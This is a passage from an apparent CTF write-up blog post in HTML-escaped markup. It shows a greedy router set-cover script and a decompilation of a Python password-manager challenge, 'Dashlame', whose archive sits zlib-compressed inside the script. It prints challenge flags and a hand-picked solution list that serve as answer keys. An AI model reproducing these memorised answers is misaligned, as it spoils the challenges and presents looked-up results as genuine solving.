            &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;



&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;unique_routers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_unique_routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;#init is_covered&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;


    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution_covers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_best_router_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Adding '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' for line: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Solution size: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;The first flag is INSA{N0t_bad_f0r_a_start}. The next flag will be awarded at &amp;lt;= 135.&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;part-02&quot;&gt;Part 02&lt;/h3&gt;

&lt;p&gt;The second flag required a solution containing at most 135 routers. In order to get the 4 flags, I had to completely change of strategy but I hadn’t so much time left and wanted to work on other challenges so I did something very dirty.&lt;/p&gt;

&lt;p&gt;Pre-filling my solution array with certain routers would sometimes give better solutions than my previous script. Guess what, I did that until having a 135 routers solution. Pretty lame I agree…&lt;/p&gt;

&lt;p&gt;Here is the modification I brought to script of part 1:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BEFORE:
solution = []

AFTER:
solution = ['100284b7','57e483e5','326ceb8a','9793198c','5cc167e0','85ea0d43']
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here I am with my 135 routers solution!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INSA{135_is_pretty_g0Od_but_how_l0w_c4n_u_gO}. Get your next flag at &amp;lt;= 128&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-dashlame&quot;&gt;[Reverse] Dashlame&lt;/h2&gt;

&lt;h3 id=&quot;statement-3&quot;&gt;Statement&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Can you try our new &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/dashlame.pyc&quot; title=&quot;Password manager&quot;&gt;password manager&lt;/a&gt; ? There’s a free flag in every password archive created !&lt;/p&gt;

  &lt;p&gt;This challenge contains a second part in the Crypto category.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;uncompyle&quot;&gt;Uncompyle&lt;/h3&gt;

&lt;p&gt;As indicated by &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt;, the given file is actually some compiled python bytecode.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file dashlame.pyc
dashlame.pyc: python 2.7 byte-compiled
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luckily, it is trivial to recover the source code from python bytecode. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;uncompyle&lt;/code&gt; for this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uncompyle2 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; dashlame.py dashlame.pyc
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file dashlame.py
dashlame.py: Python script, ASCII text executable, with very long lines
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;understanding-the-script&quot;&gt;Understanding the script&lt;/h3&gt;

&lt;p&gt;The &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/dashlame.py&quot; title=&quot;Password manager&quot;&gt;script&lt;/a&gt; defines the following functions:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;def dashlame.py
def pad&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def unpad&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def get_random_passphrase&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
def get_pearson_hash&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def encrypt_stream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;data, passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def decrypt_stream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;data, passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def encrypt_archive&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;archive_filename, passphraseA, passphraseB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def decrypt_archive&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;archive_filename, passphraseA, passphraseB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
def createArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
def updateArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
def accessArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see nothing strange for a password manager. Let’s dig into the &lt;code class=&quot;highlighter-rouge&quot;&gt;createArchive()&lt;/code&gt; function since the challenge statement mentions &lt;em&gt;a flag in every password archive created&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;archive_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Please enter your archive name: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_random_passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'This is your passphrase :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Please remember it or you will lose all your passwords.'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.db'&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;db_fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x0b\x0e\xf4\xc9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,IUH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M,Q0f`a`ddpPP````&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4&amp;gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\xc4\xa0\xfb\x8c\x9b\x17\xa4\x98&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x10\x8d\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Q0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x88\x05\x89\x8c\xec\xe2\xf2\xf2\x8c\x8d\x82&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x01\x89\xc5\xc5\xe5\xf9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x93&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xa3\x93\x8f\xab\x02\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x18\x94\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#Bt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x14&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b\xf2\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc\x02\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;20W&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\x92&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18\x05\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mYkh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe6\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\xe5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc7\xea\x90\xcc\xe2\xf8\xa4\xd0\x92\xf8\xc4\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x93\x92\xe4\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypt_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Archive created successfully.'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see the content of the password archive stored unencrypted inside the script.&lt;/p&gt;

&lt;h3 id=&quot;resolution-2&quot;&gt;Resolution&lt;/h3&gt;

&lt;p&gt;Since the archive content is written in zlib-compressed plaintext inside the script, we can simply decompress it and print the output in order to get the content of the password archive.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Nov&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
